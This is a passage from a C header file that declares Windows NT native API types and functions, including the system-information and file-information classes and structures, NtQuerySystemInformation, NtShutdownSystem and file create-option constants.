        RtlQueryRegistryValues(
            IN ULONG  RelativeTo,
            IN PCWSTR  Path,
            IN PRTL_QUERY_REGISTRY_TABLE  QueryTable,
            IN PVOID  Context,
            IN PVOID  Environment OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Query system information

    typedef enum _SYSTEM_INFORMATION_CLASS
    {
        SystemBasicInformation,                 // 0x00 SYSTEM_BASIC_INFORMATION
        SystemProcessorInformation,             // 0x01 SYSTEM_PROCESSOR_INFORMATION
        SystemPerformanceInformation,           // 0x02
        SystemTimeOfDayInformation,             // 0x03
        SystemPathInformation,                  // 0x04
        SystemProcessInformation,               // 0x05
        SystemCallCountInformation,             // 0x06
        SystemDeviceInformation,                // 0x07
        SystemProcessorPerformanceInformation,  // 0x08
        SystemFlagsInformation,                 // 0x09
        SystemCallTimeInformation,              // 0x0A
        SystemModuleInformation,                // 0x0B SYSTEM_MODULE_INFORMATION
        SystemLocksInformation,                 // 0x0C
        SystemStackTraceInformation,            // 0x0D
        SystemPagedPoolInformation,             // 0x0E
        SystemNonPagedPoolInformation,          // 0x0F
        SystemHandleInformation,                // 0x10
        SystemObjectInformation,                // 0x11
        SystemPageFileInformation,              // 0x12
        SystemVdmInstemulInformation,           // 0x13
        SystemVdmBopInformation,                // 0x14
        SystemFileCacheInformation,             // 0x15
        SystemPoolTagInformation,               // 0x16
        SystemInterruptInformation,             // 0x17
        SystemDpcBehaviorInformation,           // 0x18
        SystemFullMemoryInformation,            // 0x19
        SystemLoadGdiDriverInformation,         // 0x1A
        SystemUnloadGdiDriverInformation,       // 0x1B
        SystemTimeAdjustmentInformation,        // 0x1C
        SystemSummaryMemoryInformation,         // 0x1D
        SystemNextEventIdInformation,           // 0x1E
        SystemEventIdsInformation,              // 0x1F
        SystemCrashDumpInformation,             // 0x20
        SystemExceptionInformation,             // 0x21
        SystemCrashDumpStateInformation,        // 0x22
        SystemKernelDebuggerInformation,        // 0x23
        SystemContextSwitchInformation,         // 0x24
        SystemRegistryQuotaInformation,         // 0x25
        SystemExtendServiceTableInformation,    // 0x26
        SystemPrioritySeperation,               // 0x27
        SystemPlugPlayBusInformation,           // 0x28
        SystemDockInformation,                  // 0x29
        //SystemPowerInformation,               // 0x2A
        //SystemProcessorSpeedInformation,      // 0x2B
        //SystemCurrentTimeZoneInformation,     // 0x2C
        //SystemLookasideInformation            // 0x2D

    } SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

    //
    // Thread priority
    //

    typedef LONG KPRIORITY;

    //
    // Basic System information
    // NtQuerySystemInformation with SystemBasicInformation
    //

    typedef struct _SYSTEM_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG TimerResolution;
        ULONG PageSize;
        ULONG NumberOfPhysicalPages;
        ULONG LowestPhysicalPageNumber;
        ULONG HighestPhysicalPageNumber;
        ULONG AllocationGranularity;
        ULONG MinimumUserModeAddress;
        ULONG MaximumUserModeAddress;
        KAFFINITY ActiveProcessorsAffinityMask;
        CCHAR NumberOfProcessors;
    } SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;

    //
    // Processor information
    // NtQuerySystemInformation with SystemProcessorInformation
    //

    typedef struct _SYSTEM_PROCESSOR_INFORMATION {
        USHORT ProcessorArchitecture;
        USHORT ProcessorLevel;
        USHORT ProcessorRevision;
        USHORT Reserved;
        ULONG ProcessorFeatureBits;
    } SYSTEM_PROCESSOR_INFORMATION, * PSYSTEM_PROCESSOR_INFORMATION;

    //
    // Performance information
    // NtQuerySystemInformation with SystemPerformanceInformation
    //

    typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
        LARGE_INTEGER IdleProcessTime;
        LARGE_INTEGER IoReadTransferCount;
        LARGE_INTEGER IoWriteTransferCount;
        LARGE_INTEGER IoOtherTransferCount;
        ULONG IoReadOperationCount;
        ULONG IoWriteOperationCount;
        ULONG IoOtherOperationCount;
        ULONG AvailablePages;
        ULONG CommittedPages;
        ULONG CommitLimit;
        ULONG PeakCommitment;
        ULONG PageFaultCount;
        ULONG CopyOnWriteCount;
        ULONG TransitionCount;
        ULONG CacheTransitionCount;
        ULONG DemandZeroCount;
        ULONG PageReadCount;
        ULONG PageReadIoCount;
        ULONG CacheReadCount;
        ULONG CacheIoCount;
        ULONG DirtyPagesWriteCount;
        ULONG DirtyWriteIoCount;
        ULONG MappedPagesWriteCount;
        ULONG MappedWriteIoCount;
        ULONG PagedPoolPages;
        ULONG NonPagedPoolPages;
        ULONG PagedPoolAllocs;
        ULONG PagedPoolFrees;
        ULONG NonPagedPoolAllocs;
        ULONG NonPagedPoolFrees;
        ULONG FreeSystemPtes;
        ULONG ResidentSystemCodePage;
        ULONG TotalSystemDriverPages;
        ULONG TotalSystemCodePages;
        ULONG NonPagedPoolLookasideHits;
        ULONG PagedPoolLookasideHits;
        ULONG Spare3Count;
        ULONG ResidentSystemCachePage;
        ULONG ResidentPagedPoolPage;
        ULONG ResidentSystemDriverPage;
        ULONG CcFastReadNoWait;
        ULONG CcFastReadWait;
        ULONG CcFastReadResourceMiss;
        ULONG CcFastReadNotPossible;
        ULONG CcFastMdlReadNoWait;
        ULONG CcFastMdlReadWait;
        ULONG CcFastMdlReadResourceMiss;
        ULONG CcFastMdlReadNotPossible;
        ULONG CcMapDataNoWait;
        ULONG CcMapDataWait;
        ULONG CcMapDataNoWaitMiss;
        ULONG CcMapDataWaitMiss;
        ULONG CcPinMappedDataCount;
        ULONG CcPinReadNoWait;
        ULONG CcPinReadWait;
        ULONG CcPinReadNoWaitMiss;
        ULONG CcPinReadWaitMiss;
        ULONG CcCopyReadNoWait;
        ULONG CcCopyReadWait;
        ULONG CcCopyReadNoWaitMiss;
        ULONG CcCopyReadWaitMiss;
        ULONG CcMdlReadNoWait;
        ULONG CcMdlReadWait;
        ULONG CcMdlReadNoWaitMiss;
        ULONG CcMdlReadWaitMiss;
        ULONG CcReadAheadIos;
        ULONG CcLazyWriteIos;
        ULONG CcLazyWritePages;
        ULONG CcDataFlushes;
        ULONG CcDataPages;
        ULONG ContextSwitches;
        ULONG FirstLevelTbFills;
        ULONG SecondLevelTbFills;
        ULONG SystemCalls;
    } SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;

    //
    // Time of Day information
    // NtQuerySystemInformation with SystemTimeOfDayInformation
    //

    typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
        LARGE_INTEGER BootTime;
        LARGE_INTEGER CurrentTime;
        LARGE_INTEGER TimeZoneBias;
        ULONG TimeZoneId;
        ULONG Reserved;
    } SYSTEM_TIMEOFDAY_INFORMATION, * PSYSTEM_TIMEOFDAY_INFORMATION;

    //
    // Process information
    // NtQuerySystemInformation with SystemProcessInformation
    //

    typedef struct _SYSTEM_PROCESS_INFORMATION {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        LARGE_INTEGER SpareLi1;
        LARGE_INTEGER SpareLi2;
        LARGE_INTEGER SpareLi3;
        LARGE_INTEGER CreateTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER KernelTime;
        UNICODE_STRING ImageName;
        KPRIORITY BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;
        ULONG HandleCount;
        // Next part is platform dependent

    } SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

    //
    // Device information
    // NtQuerySystemInformation with SystemDeviceInformation
    //

    typedef struct _SYSTEM_DEVICE_INFORMATION {
        ULONG NumberOfDisks;
        ULONG NumberOfFloppies;
        ULONG NumberOfCdRoms;
        ULONG NumberOfTapes;
        ULONG NumberOfSerialPorts;
        ULONG NumberOfParallelPorts;
    } SYSTEM_DEVICE_INFORMATION, * PSYSTEM_DEVICE_INFORMATION;

    //
    // Processor performance information
    // NtQuerySystemInformation with SystemProcessorPerformanceInformation
    //

    typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
        LARGE_INTEGER IdleTime;
        LARGE_INTEGER KernelTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER DpcTime;          // DEVL only
        LARGE_INTEGER InterruptTime;    // DEVL only
        ULONG InterruptCount;
    } SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, * PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

    //
    // NT Global Flag information
    // NtQuerySystemInformation with SystemFlagsInformation
    //

    typedef struct _SYSTEM_FLAGS_INFORMATION
    {
        ULONG GlobalFlag;

    } SYSTEM_FLAGS_INFORMATION, * PSYSTEM_FLAGS_INFORMATION;

    //
    // System Module information
    // NtQuerySystemInformation with SystemModuleInformation
    //

    typedef struct _SYSTEM_MODULE
    {
        ULONG  Reserved1;                   // Should be 0xBAADF00D
        ULONG  Reserved2;                   // Should be zero
        PVOID  Base;
        ULONG  Size;
        ULONG  Flags;
        USHORT Index;
        USHORT Unknown;
        USHORT LoadCount;
        USHORT ModuleNameOffset;
        CHAR   ImageName[256];

    } SYSTEM_MODULE, * PSYSTEM_MODULE;


    typedef struct _SYSTEM_MODULE_INFORMATION
    {
        ULONG         ModulesCount;
        SYSTEM_MODULE Modules[1];

    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

    /*
    typedef struct _SYSTEM_VDM_INSTEMUL_INFO {
        ULONG SegmentNotPresent ;
        ULONG VdmOpcode0F       ;
        ULONG OpcodeESPrefix    ;
        ULONG OpcodeCSPrefix    ;
        ULONG OpcodeSSPrefix    ;
        ULONG OpcodeDSPrefix    ;
        ULONG OpcodeFSPrefix    ;
        ULONG OpcodeGSPrefix    ;
        ULONG OpcodeOPER32Prefix;
        ULONG OpcodeADDR32Prefix;
        ULONG OpcodeINSB        ;
        ULONG OpcodeINSW        ;
        ULONG OpcodeOUTSB       ;
        ULONG OpcodeOUTSW       ;
        ULONG OpcodePUSHF       ;
        ULONG OpcodePOPF        ;
        ULONG OpcodeINTnn       ;
        ULONG OpcodeINTO        ;
        ULONG OpcodeIRET        ;
        ULONG OpcodeINBimm      ;
        ULONG OpcodeINWimm      ;
        ULONG OpcodeOUTBimm     ;
        ULONG OpcodeOUTWimm     ;
        ULONG OpcodeINB         ;
        ULONG OpcodeINW         ;
        ULONG OpcodeOUTB        ;
        ULONG OpcodeOUTW        ;
        ULONG OpcodeLOCKPrefix  ;
        ULONG OpcodeREPNEPrefix ;
        ULONG OpcodeREPPrefix   ;
        ULONG OpcodeHLT         ;
        ULONG OpcodeCLI         ;
        ULONG OpcodeSTI         ;
        ULONG BopCount          ;
    } SYSTEM_VDM_INSTEMUL_INFO, *PSYSTEM_VDM_INSTEMUL_INFO;


    typedef struct _SYSTEM_QUERY_TIME_ADJUST_INFORMATION {
        ULONG TimeAdjustment;
        ULONG TimeIncrement;
        BOOLEAN Enable;
    } SYSTEM_QUERY_TIME_ADJUST_INFORMATION, *PSYSTEM_QUERY_TIME_ADJUST_INFORMATION;

    typedef struct _SYSTEM_SET_TIME_ADJUST_INFORMATION {
        ULONG TimeAdjustment;
        BOOLEAN Enable;
    } SYSTEM_SET_TIME_ADJUST_INFORMATION, *PSYSTEM_SET_TIME_ADJUST_INFORMATION;


    typedef struct _SYSTEM_THREAD_INFORMATION {
        LARGE_INTEGER KernelTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER CreateTime;
        ULONG WaitTime;
        PVOID StartAddress;
        CLIENT_ID ClientId;
        KPRIORITY Priority;
        LONG BasePriority;
        ULONG ContextSwitches;
        ULONG ThreadState;
        ULONG WaitReason;
    } SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

    typedef struct _SYSTEM_MEMORY_INFO {
        PUCHAR StringOffset;
        USHORT ValidCount;
        USHORT TransitionCount;
        USHORT ModifiedCount;
        USHORT PageTableCount;
    } SYSTEM_MEMORY_INFO, *PSYSTEM_MEMORY_INFO;

    typedef struct _SYSTEM_MEMORY_INFORMATION {
        ULONG InfoSize;
        ULONG StringStart;
        SYSTEM_MEMORY_INFO Memory[1];
    } SYSTEM_MEMORY_INFORMATION, *PSYSTEM_MEMORY_INFORMATION;

    typedef struct _SYSTEM_CALL_COUNT_INFORMATION {
        ULONG Length;
        ULONG NumberOfTables;
        //ULONG NumberOfEntries[NumberOfTables];
        //ULONG CallCounts[NumberOfTables][NumberOfEntries];
    } SYSTEM_CALL_COUNT_INFORMATION, *PSYSTEM_CALL_COUNT_INFORMATION;

    typedef struct _SYSTEM_CRASH_DUMP_INFORMATION {
        HANDLE CrashDumpSection;
    } SYSTEM_CRASH_DUMP_INFORMATION, *PSYSTEM_CRASH_DUMP_INFORMATION;

    typedef struct _SYSTEM_EXCEPTION_INFORMATION {
        ULONG AlignmentFixupCount;
        ULONG ExceptionDispatchCount;
        ULONG FloatingEmulationCount;
        ULONG ByteWordEmulationCount;
    } SYSTEM_EXCEPTION_INFORMATION, *PSYSTEM_EXCEPTION_INFORMATION;

    typedef struct _SYSTEM_CRASH_STATE_INFORMATION {
        ULONG ValidCrashDump;
    } SYSTEM_CRASH_STATE_INFORMATION, *PSYSTEM_CRASH_STATE_INFORMATION;

    typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
        BOOLEAN KernelDebuggerEnabled;
        BOOLEAN KernelDebuggerNotPresent;
    } SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

    typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
        ULONG RegistryQuotaAllowed;
        ULONG RegistryQuotaUsed;
        ULONG PagedPoolSize;
    } SYSTEM_REGISTRY_QUOTA_INFORMATION, *PSYSTEM_REGISTRY_QUOTA_INFORMATION;

    typedef struct _SYSTEM_GDI_DRIVER_INFORMATION {
        UNICODE_STRING DriverName;
        PVOID ImageAddress;
        PVOID SectionPointer;
        PVOID EntryPoint;
        PIMAGE_EXPORT_DIRECTORY ExportSectionPointer;
    } SYSTEM_GDI_DRIVER_INFORMATION, *PSYSTEM_GDI_DRIVER_INFORMATION;
    */

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQuerySystemInformation(
            IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
            OUT PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength
        );

    //------------------------------------------------------------------------------
    // Shutdown system

    typedef enum _SHUTDOWN_ACTION
    {
        ShutdownNoReboot,
        ShutdownReboot,
        ShutdownPowerOff

    } SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtShutdownSystem(
            IN SHUTDOWN_ACTION Action
        );

    //-----------------------------------------------------------------------------
    // File functions

#ifndef OLD_DOS_VOLID
#define OLD_DOS_VOLID   0x00000008
#endif

#ifndef FILE_SUPERSEDE
#define FILE_SUPERSEDE                  0x00000000
#define FILE_OPEN                       0x00000001
#define FILE_CREATE                     0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_OVERWRITE                  0x00000004
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_MAXIMUM_DISPOSITION        0x00000005
#endif  // File create flags


// Define the create/open option flags
#ifndef FILE_DIRECTORY_FILE
#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008
#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080
#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800
#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000
#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000
#endif // FILE_DIRECTORY_FILE


//
// Define the I/O status information return values for NtCreateFile/NtOpenFile
//

#ifndef FILE_SUPERSEDED
#define FILE_SUPERSEDED                 0x00000000
#define FILE_OPENED                     0x00000001
#define FILE_CREATED                    0x00000002
#define FILE_OVERWRITTEN                0x00000003
#define FILE_EXISTS                     0x00000004
#define FILE_DOES_NOT_EXIST             0x00000005
#endif


#ifndef PIO_APC_ROUTINE_DEFINED
    typedef
        VOID
        (NTAPI* PIO_APC_ROUTINE) (
            IN PVOID ApcContext,
            IN PIO_STATUS_BLOCK IoStatusBlock,
            IN ULONG Reserved
            );
#define PIO_APC_ROUTINE_DEFINED
#endif  // PIO_APC_ROUTINE_DEFINED


    typedef enum _FILE_INFORMATION_CLASS
    {
        FileDirectoryInformation = 1,
        FileFullDirectoryInformation,   // 2
        FileBothDirectoryInformation,   // 3
        FileBasicInformation,           // 4  wdm
        FileStandardInformation,        // 5  wdm
        FileInternalInformation,        // 6
        FileEaInformation,              // 7
        FileAccessInformation,          // 8
        FileNameInformation,            // 9
        FileRenameInformation,          // 10
        FileLinkInformation,            // 11
        FileNamesInformation,           // 12
        FileDispositionInformation,     // 13
        FilePositionInformation,        // 14 wdm
        FileFullEaInformation,          // 15
        FileModeInformation,            // 16
        FileAlignmentInformation,       // 17
        FileAllInformation,             // 18
        FileAllocationInformation,      // 19
        FileEndOfFileInformation,       // 20 wdm
        FileAlternateNameInformation,   // 21
        FileStreamInformation,          // 22
        FilePipeInformation,            // 23
        FilePipeLocalInformation,       // 24
        FilePipeRemoteInformation,      // 25
        FileMailslotQueryInformation,   // 26
        FileMailslotSetInformation,     // 27
        FileCompressionInformation,     // 28
        FileObjectIdInformation,        // 29
        FileCompletionInformation,      // 30
        FileMoveClusterInformation,     // 31
        FileQuotaInformation,           // 32
        FileReparsePointInformation,    // 33
        FileNetworkOpenInformation,     // 34
        FileAttributeTagInformation,    // 35
        FileTrackingInformation,        // 36
        FileIdBothDirectoryInformation, // 37
        FileIdFullDirectoryInformation, // 38
        FileValidDataLengthInformation, // 39
        FileShortNameInformation,       // 40
        FileIoCompletionNotificationInformation, // 41
        FileIoStatusBlockRangeInformation,       // 42
        FileIoPriorityHintInformation,           // 43
        FileSfioReserveInformation,              // 44
        FileSfioVolumeInformation,               // 45
        FileHardLinkInformation,                 // 46
        FileProcessIdsUsingFileInformation,      // 47
        FileMaximumInformation                   // 48
    } FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;


    typedef struct _FILE_DIRECTORY_INFORMATION {
        ULONG NextEntryOffset;
        ULONG FileIndex;
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER EndOfFile;
        LARGE_INTEGER AllocationSize;
        ULONG FileAttributes;
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;


    typedef struct _FILE_FULL_DIR_INFORMATION {
        ULONG NextEntryOffset;
        ULONG FileIndex;
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER EndOfFile;
        LARGE_INTEGER AllocationSize;
        ULONG FileAttributes;
        ULONG FileNameLength;
        ULONG EaSize;
        WCHAR FileName[1];
    } FILE_FULL_DIR_INFORMATION, * PFILE_FULL_DIR_INFORMATION;


    typedef struct _FILE_BOTH_DIR_INFORMATION {
        ULONG NextEntryOffset;
        ULONG FileIndex;
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER EndOfFile;
        LARGE_INTEGER AllocationSize;
        ULONG FileAttributes;
        ULONG FileNameLength;
        ULONG EaSize;
        CCHAR ShortNameLength;
        WCHAR ShortName[12];
        WCHAR FileName[1];
    } FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION;


    typedef struct _FILE_BASIC_INFORMATION {
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        ULONG FileAttributes;
    } FILE_BASIC_INFORMATION, * PFILE_BASIC_INFORMATION;


    typedef struct _FILE_STANDARD_INFORMATION {
        LARGE_INTEGER AllocationSize;
        LARGE_INTEGER EndOfFile;
        ULONG NumberOfLinks;
        BOOLEAN DeletePending;
        BOOLEAN Directory;
    } FILE_STANDARD_INFORMATION, * PFILE_STANDARD_INFORMATION;


    typedef struct _FILE_INTERNAL_INFORMATION {
        LARGE_INTEGER IndexNumber;
    } FILE_INTERNAL_INFORMATION, * PFILE_INTERNAL_INFORMATION;


    typedef struct _FILE_EA_INFORMATION {
        ULONG EaSize;
    } FILE_EA_INFORMATION, * PFILE_EA_INFORMATION;


    typedef struct _FILE_ACCESS_INFORMATION {
        ACCESS_MASK AccessFlags;
    } FILE_ACCESS_INFORMATION, * PFILE_ACCESS_INFORMATION;


    typedef struct _FILE_NAME_INFORMATION {
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_NAME_INFORMATION, * PFILE_NAME_INFORMATION;


    typedef struct _FILE_RENAME_INFORMATION {
        BOOLEAN ReplaceIfExists;
        HANDLE RootDirectory;
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_RENAME_INFORMATION, * PFILE_RENAME_INFORMATION;


    typedef struct _FILE_NAMES_INFORMATION {
        ULONG NextEntryOffset;
        ULONG FileIndex;
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_NAMES_INFORMATION, * PFILE_NAMES_INFORMATION;


    typedef struct _FILE_DISPOSITION_INFORMATION {
        BOOLEAN DeleteFile;
    } FILE_DISPOSITION_INFORMATION, * PFILE_DISPOSITION_INFORMATION;


    typedef struct _FILE_POSITION_INFORMATION {
        LARGE_INTEGER CurrentByteOffset;
    } FILE_POSITION_INFORMATION, * PFILE_POSITION_INFORMATION;


    typedef struct _FILE_FULL_EA_INFORMATION {
        ULONG NextEntryOffset;
        UCHAR Flags;
        UCHAR EaNameLength;
        USHORT EaValueLength;
        CHAR EaName[1];
    } FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;


    typedef struct _FILE_MODE_INFORMATION {
        ULONG Mode;
    } FILE_MODE_INFORMATION, * PFILE_MODE_INFORMATION;


    typedef struct _FILE_ALIGNMENT_INFORMATION {
        ULONG AlignmentRequirement;
    } FILE_ALIGNMENT_INFORMATION, * PFILE_ALIGNMENT_INFORMATION;


    typedef struct _FILE_ALL_INFORMATION {
        FILE_BASIC_INFORMATION BasicInformation;
        FILE_STANDARD_INFORMATION StandardInformation;
        FILE_INTERNAL_INFORMATION InternalInformation;
        FILE_EA_INFORMATION EaInformation;
        FILE_ACCESS_INFORMATION AccessInformation;
        FILE_POSITION_INFORMATION PositionInformation;
        FILE_MODE_INFORMATION ModeInformation;
        FILE_ALIGNMENT_INFORMATION AlignmentInformation;
        FILE_NAME_INFORMATION NameInformation;
    } FILE_ALL_INFORMATION, * PFILE_ALL_INFORMATION;


    typedef struct _FILE_ALLOCATION_INFORMATION {
        LARGE_INTEGER AllocationSize;
    } FILE_ALLOCATION_INFORMATION, * PFILE_ALLOCATION_INFORMATION;


    typedef struct _FILE_END_OF_FILE_INFORMATION {
        LARGE_INTEGER EndOfFile;
    } FILE_END_OF_FILE_INFORMATION, * PFILE_END_OF_FILE_INFORMATION;


    typedef struct _FILE_STREAM_INFORMATION {
        ULONG NextEntryOffset;
        ULONG StreamNameLength;
        LARGE_INTEGER StreamSize;
        LARGE_INTEGER StreamAllocationSize;
        WCHAR StreamName[1];
    } FILE_STREAM_INFORMATION, * PFILE_STREAM_INFORMATION;

    typedef struct _FILE_PIPE_INFORMATION {
        ULONG ReadMode;
        ULONG CompletionMode;
    } FILE_PIPE_INFORMATION, * PFILE_PIPE_INFORMATION;


    typedef struct _FILE_PIPE_LOCAL_INFORMATION {
        ULONG NamedPipeType;
        ULONG NamedPipeConfiguration;
        ULONG MaximumInstances;
        ULONG CurrentInstances;
        ULONG InboundQuota;
        ULONG ReadDataAvailable;
        ULONG OutboundQuota;
        ULONG WriteQuotaAvailable;
        ULONG NamedPipeState;
        ULONG NamedPipeEnd;
    } FILE_PIPE_LOCAL_INFORMATION, * PFILE_PIPE_LOCAL_INFORMATION;


    typedef struct _FILE_PIPE_REMOTE_INFORMATION {
        LARGE_INTEGER CollectDataTime;
        ULONG MaximumCollectionCount;
    } FILE_PIPE_REMOTE_INFORMATION, * PFILE_PIPE_REMOTE_INFORMATION;


    typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
        ULONG MaximumMessageSize;
        ULONG MailslotQuota;
        ULONG NextMessageSize;
        ULONG MessagesAvailable;
        LARGE_INTEGER ReadTimeout;
    } FILE_MAILSLOT_QUERY_INFORMATION, * PFILE_MAILSLOT_QUERY_INFORMATION;


    typedef struct _FILE_MAILSLOT_SET_INFORMATION {
        PLARGE_INTEGER ReadTimeout;
    } FILE_MAILSLOT_SET_INFORMATION, * PFILE_MAILSLOT_SET_INFORMATION;


    typedef struct _FILE_COMPRESSION_INFORMATION {
        LARGE_INTEGER CompressedFileSize;
        USHORT CompressionFormat;
        UCHAR CompressionUnitShift;
        UCHAR ChunkShift;
        UCHAR ClusterShift;
        UCHAR Reserved[3];
    } FILE_COMPRESSION_INFORMATION, * PFILE_COMPRESSION_INFORMATION;


    typedef struct _FILE_LINK_INFORMATION {
        BOOLEAN ReplaceIfExists;
        HANDLE RootDirectory;
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_LINK_INFORMATION, * PFILE_LINK_INFORMATION;


    typedef struct _FILE_OBJECTID_INFORMATION
    {
        LONGLONG FileReference;
        UCHAR ObjectId[16];
        union {
            struct {
                UCHAR BirthVolumeId[16];
                UCHAR BirthObjectId[16];
                UCHAR DomainId[16];
            };
            UCHAR ExtendedInfo[48];
        };
    } FILE_OBJECTID_INFORMATION, * PFILE_OBJECTID_INFORMATION;


    typedef struct _FILE_COMPLETION_INFORMATION {
        HANDLE Port;
        PVOID Key;
    } FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;


    typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
        ULONG ClusterCount;
        HANDLE RootDirectory;
        ULONG FileNameLength;
        WCHAR FileName[1];
    } FILE_MOVE_CLUSTER_INFORMATION, * PFILE_MOVE_CLUSTER_INFORMATION;


    typedef struct _FILE_NETWORK_OPEN_INFORMATION {
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER AllocationSize;
        LARGE_INTEGER EndOfFile;
        ULONG FileAttributes;
    } FILE_NETWORK_OPEN_INFORMATION, * PFILE_NETWORK_OPEN_INFORMATION;


    typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
        ULONG FileAttributes;
        ULONG ReparseTag;
    } FILE_ATTRIBUTE_TAG_INFORMATION, * PFILE_ATTRIBUTE_TAG_INFORMATION;


    typedef struct _FILE_TRACKING_INFORMATION {
        HANDLE DestinationFile;
        ULONG ObjectInformationLength;
        CHAR ObjectInformation[1];
    } FILE_TRACKING_INFORMATION, * PFILE_TRACKING_INFORMATION;


    typedef struct _FILE_REPARSE_POINT_INFORMATION {
        LONGLONG FileReference;
        ULONG Tag;
    } FILE_REPARSE_POINT_INFORMATION, * PFILE_REPARSE_POINT_INFORMATION;


    typedef struct _FILE_QUOTA_INFORMATION {
        ULONG NextEntryOffset;
        ULONG SidLength;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER QuotaUsed;
        LARGE_INTEGER QuotaThreshold;
        LARGE_INTEGER QuotaLimit;
        SID Sid;
    } FILE_QUOTA_INFORMATION, * PFILE_QUOTA_INFORMATION;


    typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
        ULONG NextEntryOffset;
        ULONG FileIndex;
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER EndOfFile;
        LARGE_INTEGER AllocationSize;
        ULONG FileAttributes;
        ULONG FileNameLength;
        ULONG EaSize;
        CCHAR ShortNameLength;
        WCHAR ShortName[12];
        LARGE_INTEGER FileId;
        WCHAR FileName[1];
    } FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;


    typedef struct _FILE_ID_FULL_DIR_INFORMATION {
        ULONG NextEntryOffset;
        ULONG FileIndex;
        LARGE_INTEGER CreationTime;
        LARGE_INTEGER LastAccessTime;
        LARGE_INTEGER LastWriteTime;
        LARGE_INTEGER ChangeTime;
        LARGE_INTEGER EndOfFile;
        LARGE_INTEGER AllocationSize;
        ULONG FileAttributes;
        ULONG FileNameLength;
        ULONG EaSize;
        LARGE_INTEGER FileId;
        WCHAR FileName[1];
    } FILE_ID_FULL_DIR_INFORMATION, * PFILE_ID_FULL_DIR_INFORMATION;


    typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
        LARGE_INTEGER ValidDataLength;
    } FILE_VALID_DATA_LENGTH_INFORMATION, * PFILE_VALID_DATA_LENGTH_INFORMATION;

